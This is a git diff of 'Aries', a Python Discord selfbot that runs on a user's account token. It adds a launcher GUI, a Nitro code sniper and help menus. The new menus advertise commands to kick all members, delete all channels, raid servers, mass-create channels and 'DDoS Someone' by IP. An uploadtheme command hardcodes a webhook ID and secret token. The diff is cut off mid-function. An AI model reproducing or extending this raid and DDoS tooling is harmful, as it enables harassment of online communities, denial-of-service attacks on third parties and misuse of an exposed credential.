@@ -34,6 +34,12 @@ import win32.lib.win32con as win32con
 import win32gui
 from datetime import datetime
 from pathlib import Path
+import socket
+import threading
+import subprocess, platform
+import subprocess as sp
+from playsound import playsound
+
 start_time = datetime.now()
 theme = ""
     #Checks if config file exists if it dosen't make the user input token to create one
@@ -62,7 +68,8 @@ else:
         "prefix": f"{pi}",
         "sniper": f"{snipe}",
         "detector": f"{detect}",
-        "theme": "Aries"
+        "theme": "Aries",
+        "AFK": "False"
     }
     ISDIR = os.path.isdir("./data")
     ISDIR2 = os.path.isdir("./data/themes")
@@ -85,11 +92,10 @@ else:
     #Write To Config File
     with open("./data/config.json", "w") as f:
         f.write(json.dumps(data, indent=4))
-
     themedata = {
         "title": "Aries",
         "imageurl":"https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif",
-        "color": "#493BB9"
+        "color": "#FF0000"
     }
     #Write Theme
     ISTHEME = os.path.isfile("/data/themes/Aries.json")
@@ -98,6 +104,14 @@ else:
       f.write(json.dumps(themedata, indent=4))
     else:
         pass
+    #Download Assets
+    url = 'https://cdn.discordapp.com/attachments/811054611116982293/903074932425117696/resizedaries2.png'
+    r = requests.get(url, allow_redirects=True)
+    open('./assets/resizedaries2.png', 'wb').write(r.content)
+    url = 'https://cdn.discordapp.com/attachments/811054611116982293/903074618905096212/ariesnobg.ico'
+    r = requests.get(url, allow_redirects=True)
+    open('./assets/ariesnobg.ico', 'wb').write(r.content)
+
 #Opens the json 
 with open("./data/config.json") as f:
 #Loads the json to read contents
@@ -107,124 +121,159 @@ token = config.get('token')
 nitro_sniper = config.get('sniper')
 selfbot_detector = config.get('detector')
 theme_2 = config.get('theme')
+afkmode = config.get('AFK')
+afklogging = False
 copier = False
 person = ""
 build = "1.0"
-commandamt = "57 "
+commandamt = "68 "
 bot = commands.Bot(prefix, self_bot=True, case_insensitive=True, guild_subscription_options=GuildSubscriptionOptions.off())
 #GUI
 the_program_to_hide = win32gui.GetForegroundWindow()
 #win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
+def runGUI():
+    root = tk.Tk()
+    root.overrideredirect(True)
+    canvas = tk.Canvas(root)
+    #When you exit also closes python
+    root.protocol("WM_DELETE_WINDOW", lambda:os._exit(1))
+    #Title
+    root.title('Aries Launcher')
+    #Size
+    root.geometry('600x300+300+300')
+    #Color
+    root.configure(bg="gray10")
+    #Icon
+    root.iconbitmap("assets/ariesnobg.ico")
 
-root = tk.Tk()
-root.overrideredirect(True)
-canvas = tk.Canvas(root)
-#When you exit also closes python
-root.protocol("WM_DELETE_WINDOW", lambda:exit())
-#Title
-root.title('Aries Launcher')
-#Size
-root.geometry('600x300+300+300')
-#Color
-root.configure(bg="gray10")
-#Icon
-root.iconbitmap("assets/ariesnobg.ico")
+    #Exit Button
+    exitButton = tk.Button(root, text="Exit", command=lambda:os._exit(1), height=1, width=85, bg='gray18', fg='white', borderwidth=0)
+    exitButton.place(x=1, y=276)
+    #Settings Button
+    def dosettings():
+        root1 = tk.Toplevel()
+        root1.overrideredirect(True)
+        canvas1 = tk.Canvas(root)
+        usedfont = font.Font(family='Helvetica', size=25)
+        def movewindow(event): root1.geometry('+{0}+{1}'.format(event.x_root, event.y_root))
 
-#Exit Button
-exitButton = tk.Button(root, text="Exit", command=lambda:exit(), height=1, width=85, bg='gray18', fg='white', borderwidth=0)
-exitButton.place(x=1, y=276)
-#Settings Button
-def dosettings():
-    root1 = tk.Toplevel()
-    root1.overrideredirect(True)
-    canvas1 = tk.Canvas(root)
-    usedfont = font.Font(family='Helvetica', size=25)
-    def movewindow(event): root1.geometry('+{0}+{1}'.format(event.x_root, event.y_root))
+        T1 = tk.Text(root1, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
+        T1.place(x=1, y=1)
+        T1.insert(tk.END, "A R I E S")
+        T1.config(state='disabled')
+        #Logo
+        path = "assets/resizedaries2.png"
+        imgy = ImageTk.PhotoImage(Image.open(path))
+        paney = tk.Label(root1, image = imgy, bg='gray10')
+        paney.pack(side = "left", fill = "none", expand = "no")
+        paney.place(x=235, y=20)
+        #Text For Theme
+        usedfont = font.Font(family='Helvetica')
+        T2 = tk.Text(root1, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
+        T2.place(x=1, y=245)
+        T2.insert(tk.END, "Themes:")
+        T2.config(state='disabled')
+        #Exit Button 
+        exitButton2 = tk.Button(root1, text="➤", command=lambda:root1.destroy(), height=1, width=5, bg='gray10', fg='white', borderwidth=0)
+        exitButton2.place(x=565, y=1)
+        #Text For Notes
+        usedfont = font.Font(family='Helvetica')
+        T2 = tk.Text(root1, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
+        T2.place(x=90, y=245)
+        T2.insert(tk.END, "Notes:")
+        T2.config(state='disabled')
+        #Notes
+        mode1 = tk.Listbox(root1, bg='gray10', fg = 'white', borderwidth=0, height=7, width=15, border=0, highlightthickness=0)
+        # to insert items in the list
+        myList = os.listdir('./data/notes')
 
-    T1 = tk.Text(root1, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
-    T1.place(x=1, y=1)
-    T1.insert(tk.END, "A R I E S")
-    T1.config(state='disabled')
+        for file in myList:
+            mode1.insert('end', file)
+        mode1.place(x=90, y=265)
+        #Themes
+        mode = tk.Listbox(root1, bg='gray10', fg = 'white', borderwidth=0, height=7, width=15, border=0, highlightthickness=0)
+        # to insert items in the list
+        myList = os.listdir('./data/themes')
+
+        for file in myList:
+            mode.insert('end', file)
+        mode.place(x=1, y=265)
+        #F
+        root1.bind('<Button-3>', movewindow)
+        root1.bind('<B3-Motion>', movewindow)
+        #Title
+        root1.title('Aries Launcher - Tab: Settings')
+        #Size
+        root1.geometry('600x300+300+300')
+        #Color
+        root1.configure(bg="gray10")
+        root1.mainloop()
+    settingsButton = tk.Button(root, text="Settings", command=lambda:dosettings(), height=1, width=85, bg='gray18', fg='white', borderwidth=0)
+    settingsButton.place(x=1, y=249)
+    #Launch Button
+    def showinfo():
+         root3 = tk.Toplevel()
+         root3.overrideredirect(True)
+         def movewindow2(event): root3.geometry('+{0}+{1}'.format(event.x_root, event.y_root))
+         canvas = tk.Canvas(root)
+         #When you exit also closes python
+         root3.protocol("WM_DELETE_WINDOW", lambda:os._exit(1))
+         #Title
+         root3.title('Aries Launcher')
+         #Size
+         root3.geometry('600x300+300+300')
+         #Color
+         root3.configure(bg="gray10")
+         #Icon
+         root3.iconbitmap("assets/ariesnobg.ico")
+         #Text
+         usedfont = font.Font(family='Helvetica', size=25)
+         T1 = tk.Text(root3, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
+         T1.place(x=1, y=1)
+         T1.insert(tk.END, "A R I E S")
+         T1.config(state='disabled')
+         #Logo
+         path1 = "assets/resizedaries2.png"
+         imgy1 = ImageTk.PhotoImage(Image.open(path1))
+         paney = tk.Label(root3, image = imgy1, bg='gray10')
+         paney.pack(side = "left", fill = "none", expand = "no")
+         paney.place(x=235, y=20)
+         #To Move window using RClick
+         root3.bind('<Button-3>', movewindow2)
+         root3.bind('<B3-Motion>', movewindow2)
+         #Exit Button for Aries Console 
+         exitButton3 = tk.Button(root3, text="➤", command=lambda:os._exit(1), height=1, width=5, bg='gray10', fg='white', borderwidth=0)
+         exitButton3.place(x=565, y=1)
+
+         root3.mainloop()
+    launchButton = tk.Button(root, text="Aries Console", command=lambda:showinfo(), height=1, width=85, bg='gray18', fg='white', borderwidth=0)
+    launchButton.place(x=1, y=222)
+    #Text
+    #create Font object
+    usedfont = font.Font(family='Helvetica')
+
+    T = tk.Text(root, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
+    T.place(x=1, y=1)
+    T.insert(tk.END, f"Prefix: {prefix}\nTheme: {theme_2}")
+    T.config(state='disabled')
+    #Text2 for some reason mroe than 3 lines dosent work on Text
+    T2 = tk.Text(root, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
+    T2.place(x=1, y=37)
+    T2.insert(tk.END, f"Commands: {commandamt}\nSniper: {nitro_sniper}")
+    T2.config(state='disabled')
+    #Exit Button 3
+    exitButton3 = tk.Button(root, text="➤", command=lambda:os._exit(1), height=1, width=5, bg='gray10', fg='white', borderwidth=0)
+    exitButton3.place(x=565, y=1)
     #Logo
     path = "assets/resizedaries2.png"
-    imgy = ImageTk.PhotoImage(Image.open(path))
-    paney = tk.Label(root1, image = imgy, bg='gray10')
-    paney.pack(side = "left", fill = "none", expand = "no")
-    paney.place(x=235, y=20)
-    #Text For Theme
-    usedfont = font.Font(family='Helvetica')
-    T2 = tk.Text(root1, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
-    T2.place(x=1, y=245)
-    T2.insert(tk.END, "Themes:")
-    T2.config(state='disabled')
-    #Exit Button 
-    exitButton2 = tk.Button(root1, text="➤", command=lambda:root1.destroy(), height=1, width=5, bg='gray10', fg='white', borderwidth=0)
-    exitButton2.place(x=565, y=1)
-    #Text For Notes
-    usedfont = font.Font(family='Helvetica')
-    T2 = tk.Text(root1, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
-    T2.place(x=90, y=245)
-    T2.insert(tk.END, "Notes:")
-    T2.config(state='disabled')
-    #Notes
-    mode1 = tk.Listbox(root1, bg='gray10', fg = 'white', borderwidth=0, height=7, width=15, border=0, highlightthickness=0)
-    # to insert items in the list
-    myList = os.listdir('./data/notes')
-
-    for file in myList:
-        mode1.insert('end', file)
-    mode1.place(x=90, y=265)
-    #Themes
-    mode = tk.Listbox(root1, bg='gray10', fg = 'white', borderwidth=0, height=7, width=15, border=0, highlightthickness=0)
-    # to insert items in the list
-    myList = os.listdir('./data/themes')
-
-    for file in myList:
-        mode.insert('end', file)
-    mode.place(x=1, y=265)
-    #F
-    root1.bind('<Button-3>', movewindow)
-    root1.bind('<B3-Motion>', movewindow)
-    #Title
-    root1.title('Aries Launcher - Tab: Settings')
-    #Size
-    root1.geometry('600x300+300+300')
-    #Color
-    root1.configure(bg="gray10")
-    root1.mainloop()
-settingsButton = tk.Button(root, text="Settings", command=lambda:dosettings(), height=1, width=85, bg='gray18', fg='white', borderwidth=0)
-settingsButton.place(x=1, y=249)
-#Launch Button
-def dolaunch():
-    root.destroy()
-launchButton = tk.Button(root, text="Launch", command=lambda:dolaunch(), height=1, width=85, bg='gray18', fg='white', borderwidth=0)
-launchButton.place(x=1, y=222)
-#Text
-#create Font object
-usedfont = font.Font(family='Helvetica')
-
-T = tk.Text(root, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
-T.place(x=1, y=1)
-T.insert(tk.END, f"Prefix: {prefix}\nTheme: {theme_2}")
-T.config(state='disabled')
-#Text2 for some reason mroe than 3 lines dosent work on Text
-T2 = tk.Text(root, height=2, width=30, bg = 'gray10', fg = 'Medium Purple', borderwidth=0, font=usedfont)
-T2.place(x=1, y=37)
-T2.insert(tk.END, f"Commands: {commandamt}\nSniper: {nitro_sniper}")
-T2.config(state='disabled')
-#Exit Button 3
-exitButton3 = tk.Button(root, text="➤", command=lambda:exit(), height=1, width=5, bg='gray10', fg='white', borderwidth=0)
-exitButton3.place(x=565, y=1)
-#Logo
-path = "assets/resizedaries2.png"
-img = ImageTk.PhotoImage(Image.open(path))
-panel = tk.Label(root, image = img, bg='gray10')
-panel.pack(side = "left", fill = "none", expand = "no")
-panel.place(x=235, y=20)
-def movewindow(event): root.geometry('+{0}+{1}'.format(event.x_root, event.y_root))
-root.bind('<Button-3>', movewindow)
-root.bind('<B3-Motion>', movewindow)
-root.mainloop()
+    img = ImageTk.PhotoImage(Image.open(path))
+    panel = tk.Label(root, image = img, bg='gray10')
+    panel.pack(side = "left", fill = "none", expand = "no")
+    panel.place(x=235, y=20)
+    def movewindow(event): root.geometry('+{0}+{1}'.format(event.x_root, event.y_root))
+    root.bind('<Button-3>', movewindow)
+    root.bind('<B3-Motion>', movewindow)
+    root.mainloop()
 
 bot.remove_command("help")
 bot.remove_command("admin")
@@ -234,15 +283,6 @@ async def on_ready():
     notif = ToastNotifier()
     #notif.show_toast("Aries Selfbot",f"Successfully Logged in! Welcome to Aries {bot.user}", icon_path="assets/ariesnobg.ico", duration=10)
     os.system('cls' if os.name == 'nt' else 'clear')
-    print("Loading")
-    bar = Fore.RESET + "\n\n███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████"
-    for char in bar:
-        await asyncio.sleep(.03)
-        sys.stdout.write(char)
-        done = "true"
-        sys.stdout.flush()
-    if done == "true":
-                os.system('cls' if os.name == 'nt' else 'clear')
     print(Fore.CYAN + "                                                  ___         _          ")
     print(Fore.CYAN + "                                                 /   |  _____(_)__  _____")
     print(Fore.CYAN + "                                                / /| | / ___/ / _ \/ ___/")
@@ -260,6 +300,13 @@ async def on_ready():
     print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.BLUE + " (Please Note that your token is safe and is only stored in a json file) " + Fore.RESET)     
 @bot.event
 async def on_message(message):
+    #AFK Mode
+    if isinstance(message.channel, discord.channel.DMChannel) and afkmode == 'True':
+       message.channel.send("im currently AFK")
+    mention = f'<@!{bot.user.id}>'
+    if (mention in message.content and afkmode == 'True'):
+        await message.channel.send("Im currently AFK")
+    #Copycat
     if message.author.name == person and copier:
          await message.channel.send(message.content)
     #Loads All Embeds it finds
@@ -285,6 +332,7 @@ async def on_message(message):
                 print(Fore.CYAN + " Info |" + Fore.RED + "[Nitro]" + Fore.CYAN + " Sadly this code has been redeemed already. | " + Fore.RESET + f" Code: {code} | " + Fore.RED + "Error")
             elif 'nitro' in r:
                 print(Fore.CYAN + "Info |" + Fore.GREEN + "[Nitro] " + Fore.CYAN + " Nitro Sniped Successfully! | " + Fore.RESET +  f"Code: {code}'")
+                playsound(f'{os.getcwd()}/assets/nitro.mp3')
             elif 'Unknown Gift Code' in r:
                 print(Fore.CYAN + "Info | " + Fore.YELLOW + "[Nitro] " + Fore.CYAN + f"An invalid code was posted | Code: {code} | " + Fore.RED + "Error")
             else:
@@ -306,7 +354,7 @@ async def help(ctx):
     #readableHex
     sixteenIntegerHex = int(color.replace("#", ""), 16)
     readableHex = int(hex(sixteenIntegerHex), 0)
-    embed = discord.Embed(title=config.get('title'), description = f"\nHelp » Display this menu » [.help]\nAdmin » Display the admin page » [.admin]\nFun » Display the fun page » [.fun]\nMisc » Display the Misc page » [.misc]\nNSFW  » Display the NSFW page » [.nsfw]\nSettings » Show the Settings page » [.settings] \nNotes » Display the Aries Notes page » [.notes]\nSquidgames » Display the Squidgames page » [.squidgames]\nAbuse » Display the Abuse page » [.abuse]\n\n**Aries Version » {build} » Commands » {commandamt} » Prefix » {prefix}** " , color=readableHex)
+    embed = discord.Embed(title=config.get('title'), description = f"\nHelp » Display this menu » [{prefix}help]\nAdmin » Display the admin page » [{prefix}admin]\nFun » Display the fun page » [{prefix}fun]\nMisc » Display the Misc page » [{prefix}misc]\nNSFW  » Display the NSFW page » [{prefix}nsfw]\nSettings » Show the Settings page » [{prefix}settings] \nNotes » Display the Aries Notes page » [{prefix}notes]\nSquidgames » Display the Squidgames page » [{prefix}squidgames]\nAbuse » Display the Abuse page » [{prefix}abuse]\nTheme » Display the Themes page » [{prefix}theme]\nUtilities » Display the Utilities page » [{prefix}utilities]\n\n**Aries Version » {build} » Commands » {commandamt} » Prefix » {prefix}** " , color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt and destiny")
     await ctx.message.delete()
@@ -321,7 +369,7 @@ async def abuse(ctx):
     #readableHex
     sixteenIntegerHex = int(color.replace("#", ""), 16)
     readableHex = int(hex(sixteenIntegerHex), 0)
-    embed = discord.Embed(title="Aries Abuse Menu", description = "Kickall » Kick all members of a server » <.kickall> » {reason}", color=readableHex)
+    embed = discord.Embed(title="Aries Abuse Menu", description = f"Kickall » Kick all members of a server » [{prefix}kickall]\nDelchannels » Delete all server channels » [{prefix}delchannels]\nRaid » Raid a server » [{prefix}raid]\nCreatechannels » Create 70 channels » [{prefix}createchannels]\n\n**<> = Arguments [] = Usage**", color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt and destiny")
     await ctx.message.delete()
@@ -336,7 +384,7 @@ async def admin(ctx):
     #readableHex
     sixteenIntegerHex = int(color.replace("#", ""), 16)
     readableHex = int(hex(sixteenIntegerHex), 0)
-    embed = discord.Embed(title="Aries Administrator Menu", description = "Ban » Ban A Member » <.ban> » {Member}\nKick » Kick A Member » <.kick> » {Amount}\nPurge » Purge <> of msgs » <.purge> » {Amount}\nCreate » Create a channel » <.Create> » {None}\nDelete » Delete a channel » <.delete> » {None}", color=readableHex)
+    embed = discord.Embed(title="Aries Administrator Menu", description = f"Ban » Ban A Member » [{prefix}ban <Person>]\nKick » Kick A Member » [{prefix}kick <Person>]\nPurge » Purge <> of msgs » [{prefix}purge <Amount>] » [Amount]\nCreate » Create a channel » [{prefix}Create <Args>]\nDelete » Delete a channel » [{prefix}delete <None>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt and destiny")
     await ctx.message.delete()
@@ -351,7 +399,7 @@ async def notes(ctx):
     #readableHex
     sixteenIntegerHex = int(color.replace("#", ""), 16)
     readableHex = int(hex(sixteenIntegerHex), 0)
-    embed = discord.Embed(title="Aries Notes Menu", description = "Make Note » Create a note » <.cn> » {name, contents}\nEdit Note » Edit a note » <.en> » {name, newcontents}", color=readableHex)
+    embed = discord.Embed(title="Aries Notes Menu", description = f"CN » Create a note » [{prefix}cn <Name, Content>]\nEN » Edit a note » [{prefix}en <Newname, Newcontent>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt and destiny")
     await ctx.message.delete()
@@ -366,7 +414,7 @@ async def Squidgames(ctx):
     #readableHex
     sixteenIntegerHex = int(color.replace("#", ""), 16)
     readableHex = int(hex(sixteenIntegerHex), 0)
-    embed = discord.Embed(title="Aries Squidgames Menu", description = "Even or Odd! » guess even or odd! » <.evenorodd> » {}\nStepping Stones » Are you safe? » <.steppingstones> » {}", color=readableHex)
+    embed = discord.Embed(title="Aries Squidgames Menu", description = f"evenorodd » guess even or odd! » [{prefix}evenorodd <None>]\nsteppingstones » Are you safe? » [{prefix}steppingstones <None>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt and destiny")
     await ctx.message.delete()
@@ -381,7 +429,7 @@ async def fun(ctx):
     #readableHex
     sixteenIntegerHex = int(color.replace("#", ""), 16)
     readableHex = int(hex(sixteenIntegerHex), 0)
-    embed = discord.Embed(title="Aries Fun Menu", description = "RollDice » Roll a Number! » <.roll> » {None} \nRollDice » Roll a Number! » <.roll> » {None}\nAllah » Talk to ALLAH » <.allah> » {None}\nPickup Line » Tell a pickup » <.pickup> » {None} \nJoke » Tell a joke » <.joke> » {None}\nRickRoll » Rick ur friends ;) » <.rickroll> » {None}\nLeave » Leave the current server » <.leave> » {None} \nFakeNitro » Sends a Fake Nitro Message » <.fakenitro> » {None}\nSpam » Spam a message » <.spam> » {delay, amount, message}\nMeme » Send a random meme » <.meme> » {None}\nUpload » Upload an img to imgur » <.uploadimg> » {the image}\nCopycat » Copy a user! » <.copycat> » {user, true/false}\nHowgay » How gay is a user? » <.howgay> » {user}\nDicksize » How big is a users dick? » <.dicksize> » {user}\nTypewrite » Write some text » <.typewrite> » {delay, message}\nInsult » Insult someone! » <.insult> » {person}\nIQ » Get Someones IQ » <.IQ> » {person}", color=readableHex)
+    embed = discord.Embed(title="Aries Fun Menu", description = f"RollDice » Roll a Number! » [{prefix}roll <None>]\nAllah » Talk to ALLAH » [{prefix}allah <None>]\nPickup Line » Tell a pickup » [{prefix}pickup <None>]\nJoke » Tell a joke » [{prefix}joke <None>] \nRickRoll » Rick ur friends ;) » [{prefix}rickroll <None>]\nLeave » Leave the current server » [{prefix}leave <None>]\nFakeNitro » Sends a Fake Nitro Message » [{prefix}fakenitro <None>]\nSpam » Spam a message » [{prefix}spam <Delay, amount message>]\nMeme » Send a random meme » [.meme <None>] \nUpload » Upload an img to imgur » [.uploadimg <Image Here>]\nCopycat » Copy a user! » [.copycat <User, True/False>]\nHowgay » How gay is a user? » [.howgay <User>]\nDicksize » How big is a users dick? » [.dicksize <User>]\nTypewrite » Write some text » [.typewrite <Delay, Message>]\nInsult » Insult someone! » [.insult <Person>]\nIQ » Get Someones IQ » [.IQ <Person>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt and destiny")
     await ctx.message.delete()
@@ -396,7 +444,7 @@ async def misc(ctx):
     #readableHex
     sixteenIntegerHex = int(color.replace("#", ""), 16)
     readableHex = int(hex(sixteenIntegerHex), 0)
-    embed = discord.Embed(title="Aries Misc Menu", description = "Restart » Restarts Aries » <.restart> » {None} \nUserinfo » Shows your userinfo » <.userinfo> » {None} \nTodo » Shows the bots TODO list » <.todo> » {None} \nAvatar » Display Avatar of a user » <.Avatar> » {user} \nInvite » Get an invite to Aries » <.ariesinvite> » {None} \nEmbed » Sends an Embed message » <.embed> » {title, desc}\nNick » Change your nickname » <.nick> » {newnick}\nDate » Check the date » <.date> » {None}\nTime » Check the time! » <.time> » {None}\nServer » Get Server Info! » <.server> » {None}\nInvite » Get the server invite! » <.invite> » {None}\nSend Noti » Send a windows noti » <.sendnoti> » {title, message}\nGen Password » Gen a pass » <.genpass> » {length}\nUptime Check the time sinch Launch » <.uptime> » {}", color=readableHex)
+    embed = discord.Embed(title="Aries Misc Menu", description = f"Restart » Restarts Aries » [{prefix}restart <None>]\nUserinfo » Shows your userinfo » [{prefix}userinfo <None>]\nTodo » Shows the bots TODO list » [{prefix}todo <None>]\nAvatar » Display Avatar of a user » [{prefix}Avatar <User>]\nInvite » Get an invite to Aries » [{prefix}ariesinvite <None>]\nEmbed » Sends an Embed message » [{prefix}embed <Title, Desc>]\nNick » Change your nickname » [{prefix}nick <Newnick>]\nDate » Check the date » [{prefix}date <None>]\nTime » Check the time! » [{prefix}time <None>] \nServer » Get Server Info! » [{prefix}server <None>]\nInvite » Get the server invite! » [{prefix}invite] \nSend Noti » Send a windows noti » [{prefix}sendnoti <Title, Message>]\nGen Password » Gen a pass » [{prefix}genpass <Length>]\nUptime » Check the time sinch Launch » [{prefix}uptime <None>] \nEncode b64 » Encode msg using b64 » [{prefix}ecb64 <Message>]\nDecode b64 » Decode a b64 msg » [{prefix}dcb64 <Message>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt and destiny")
     await ctx.message.delete()
@@ -411,7 +459,7 @@ async def nsfw(ctx):
     #readableHex
     sixteenIntegerHex = int(color.replace("#", ""), 16)
     readableHex = int(hex(sixteenIntegerHex), 0)
-    embed = discord.Embed(title="Aries NSFW Menu", description = "<> Is Usage\nBoobs » Shows boobs » <.boobs> » {None}\nHentai » shows hentai » <.hentai> » {None}\nPussy » Show pussy » <.pussy> » {None}\nHentaiGif » shows hentai gif » <.hentaigif> » {None}", color=readableHex)
+    embed = discord.Embed(title="Aries NSFW Menu", description = f"Boobs » Shows boobs » [{prefix}boobs <None>]\nHentai » shows hentai » [{prefix}hentai <None>]\nPussy » Show pussy » [{prefix}pussy <None>]\nHentaiGif » shows hentai gif » [{prefix}hentaigif <None>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt and destiny")
     await ctx.message.delete()
@@ -425,7 +473,21 @@ async def theme(ctx):
      color = config.get('color')
     sixteenIntegerHex = int(color.replace("#", ""), 16)
     readableHex = int(hex(sixteenIntegerHex), 0)
-    embed = discord.Embed(title="Aries Themes Menu", description = "", color=readableHex)
+    embed = discord.Embed(title="Aries Themes Menu", description = f"settheme » Set your theme »[{prefix}settheme <ThemeName>]\nuploadtheme » Upload a theme » [{prefix}uploadtheme <ThemeName>]\ncreatetheme » Create a New Theme » [{prefix}createtheme <name, title, imageurl, color>]\nedittheme » Edit a theme » [{prefix}edittheme <name, newtitle, newimage, newcolor>]\ninstalltheme » Install a Theme » [{prefix}installtheme <Name>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
+    embed.set_thumbnail(url = config.get('imageurl'))
+    embed.set_footer(text = "made with ♡ by bomt and destiny")
+    await ctx.message.delete()
+    await ctx.send(embed = embed) 
+#Attack Commands
+@bot.command()
+async def utilities(ctx):
+    with open(f"./data/themes/{theme_2}.json") as f:
+    #Loads the json to read contents
+     config = json.load(f)
+     color = config.get('color')
+    sixteenIntegerHex = int(color.replace("#", ""), 16)
+    readableHex = int(hex(sixteenIntegerHex), 0)
+    embed = discord.Embed(title="Aries Utilities Menu", description = f"ddos » DDoS Someone » [{prefix}ddos <threads, ip>]\npingip » Ping an IP » [{prefix}pingip <IP>]\nafk » Set your AFK Status » [{prefix}afk <True/False>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt and destiny")
     await ctx.message.delete()
@@ -439,7 +501,7 @@ async def settings(ctx):
      color = config.get('color')
     sixteenIntegerHex = int(color.replace("#", ""), 16)
     readableHex = int(hex(sixteenIntegerHex), 0)
-    embed = discord.Embed(title="Aries Settings Menu", description = "Status » Change your Status » <.status> » {Status}\nSniper » Check sniper status » <.sniperstatus> » {None}\nCheckPrefix » Check Aries Prefix » <.prefix> » {None}\nSBDetector » Check Aries Detection » <.selfbotdetector> » {None}\nSetSniper » Check Aries Nitro Sniper » <.setsniper> » {true/false} ", color=readableHex)
+    embed = discord.Embed(title="Aries Settings Menu", description = f"Status » Change your Status » [{prefix}status <Status>]\nSniper » Check sniper status » Check the Nitro Sniper Status » [{prefix}sniperstatus <None>]\nCheckPrefix » Check Aries Prefix » [{prefix}prefix <None>]\nSBDetector » Check Aries Detection » [{prefix}selfbotdetector <None>] » [None]\nSetSniper » Check Aries Nitro Sniper » [{prefix}setsniper <True/False>\n\n**<> = Arguments [] = Usage**", color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt and destiny")
     await ctx.message.delete()
@@ -657,7 +719,14 @@ async def userinfo(ctx):
      color = config.get('color')
     sixteenIntegerHex = int(color.replace("#", ""), 16)
     readableHex = int(hex(sixteenIntegerHex), 0)
-    embed = discord.Embed(title=config.get('title'), description = "Name: " + str(bot.user) + "\nUsers In: " + str(len(bot.guilds)) + " Guilds" + "\nAvatar ↓ ", color=readableHex)
+    global start_time
+    end_time = datetime.now()
+    embed = discord.Embed(title= config.get('title'), description = 'Time Since Start: {}'.format(end_time - start_time), color=readableHex)
+    userinfo1 = bot.get_user(bot.user.id)
+    num = 0
+    for i in range (0, len(bot.user.friends)):
+        num += 1
+    embed = discord.Embed(title=config.get('title'), description = "Name » " + str(bot.user) + "\nUsers In » " + str(len(bot.guilds)) + f" Guilds\n" + 'You have been using Aries For » {}'.format(end_time - start_time) + f"\nYour Account Was Created At »\n {userinfo1.created_at}" + f"\nYou Have: {int(num)} Friends" + "\nAvatar ↓ ", color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt and destiny")
     embed.set_image(url = str(bot.user.avatar_url))
@@ -1139,6 +1208,64 @@ async def settheme(ctx, theme1):
     embed.set_footer(text = "made with ♡ by bomt and destiny")
     await ctx.send(embed = embed)
 @bot.command()
+async def uploadtheme(ctx, themename):
+    await ctx.message.delete()
+    webhook = discord.Webhook.partial(900202510726332426, 'hzY_ELOwg1emz_xbpZvTtpv6Ee0NbPyy9yb7qpuumirnqovsRbk_asYPz6YbK1eaSWjb', adapter=discord.RequestsWebhookAdapter()) # Your webhook
+    with open(file=f'./data/themes/{themename}' + ".json", mode='rb') as f:
+     my_file = discord.File(f)
+    webhook.send(f'Theme Name: {themename}', username='Themes', file=my_file)
+@bot.command()
+async def edittheme(ctx, name, newtitle, newimage, newcolor):
+    await ctx.message.delete()
+    with open(f"./data/themes/{theme_2}.json") as f:
+    #Loads the json to read contents
+     config = json.load(f)
+     color = config.get('color')
+    sixteenIntegerHex = int(color.replace("#", ""), 16)
+    readableHex = int(hex(sixteenIntegerHex), 0)
+    data = {
+        "title": f"{newtitle}",
+        "imageurl": f"{newimage}",
+        "color": f"{newcolor}",
+    }
+    with open(f"./data/themes/{name}.json", "w") as f:
+        f.write(json.dumps(data, indent=4))
+
+    embed = discord.Embed(title= "Aries Theme", description = f"Edited theme: {name}", color=readableHex)
+    embed.set_thumbnail(url = config.get('imageurl'))
+    embed.set_footer(text = "made with ♡ by bomt and destiny")
+    await ctx.send(embed = embed)
+@bot.command()
+async def installtheme(ctx, name):
+    await ctx.message.delete()
+    with open(f"./data/themes/{theme_2}.json") as f:
+    #Loads the json to read contents
+     config = json.load(f)
+     color = config.get('color')
+    sixteenIntegerHex = int(color.replace("#", ""), 16)
+    readableHex = int(hex(sixteenIntegerHex), 0)
+    data = ""
+    if name == "Midnight":
+     data = {
+    "title": "Midnight",
